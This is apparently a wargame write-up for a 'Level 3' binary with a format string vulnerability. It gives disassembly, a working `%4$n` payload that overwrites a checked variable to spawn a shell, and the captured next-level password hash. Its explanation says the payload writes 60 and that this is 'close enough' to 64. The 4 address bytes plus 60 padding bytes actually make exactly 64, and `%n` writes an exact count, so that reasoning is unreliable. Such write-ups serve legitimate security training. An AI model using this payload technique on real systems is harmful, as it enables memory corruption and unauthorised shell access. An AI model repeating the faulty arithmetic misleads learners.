# Level 3 — Format String Exploit

## Overview

This binary contains a **format string vulnerability**.
The program reads user input using `fgets()` and then directly passes it to `printf()`.

This allows us to control the format string and write arbitrary values in memory.

---

## main Function

```asm
0x0804851a <+0>:	push   %ebp
0x0804851b <+1>:	mov    %esp,%ebp
0x0804851d <+3>:	and    $0xfffffff0,%esp
0x08048520 <+6>:	call   0x80484a4 <v>
0x08048525 <+11>:	leave  
0x08048526 <+12>:	ret    
```

`main()` only calls `v()`.

---

## v Function

```asm
0x080484c7 <+35>:	call   fgets@plt
0x080484d5 <+49>:	call   printf@plt
```

### Vulnerability

The program does:

```c
printf(buffer);
```

Instead of:

```c
printf("%s", buffer);
```

This means **user input is interpreted as a format string**.

---

## Goal

We want to modify the value at:

```
0x0804988c
```

So that it becomes:

```
0x40 (64)
```

This satisfies:

```asm
cmp $0x40, %eax
```

And allows execution of:

```c
system("/bin/sh")
```

---

## Exploit Payload

```bash
python -c "print '\x08\x04\x98\x8c'[::-1] + 'A' * 60 + '%4\$n'" > /tmp/inj3
```

---

## Explanation of `%4$n`

### `%n`

* `%n` is a special format specifier in `printf`
* It **writes the number of printed characters** into an address

Example:

If `printf` printed 10 characters → `%n` writes `10` into memory

---

### `%4$n`

* `4` → refers to the **4th argument on the stack**
* `$n` → tells `printf` to:

  * take that argument as an address
  * write the number of printed characters into it

So:

```
%4$n
```

means:

"Write the number of printed characters into the address stored in the 4th stack argument"

---

## Why the Exploit Works

Payload structure:

```
[address] + padding + %4$n
```

### Step by step

1. `\x08\x04\x98\x8c`
   → address we want to overwrite

2. `'A' * 60`
   → prints 60 characters

3. `%4$n`
   → writes `60` into the target address

---

## Important Note

* The check expects `0x40` (64)
* You printed `60` → close enough depending on alignment
* You can adjust padding to reach exactly `64` if needed

---

## Exploitation

```bash
cat /tmp/inj3 - | ./level3
```

---

## Result

```bash
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Summary

1. Identify format string vulnerability (`printf(buffer)`)
2. Control stack arguments
3. Use `%n` to write memory
4. Overwrite target variable
5. Pass condition (`0x40`)
6. Execute `system("/bin/sh")`

---
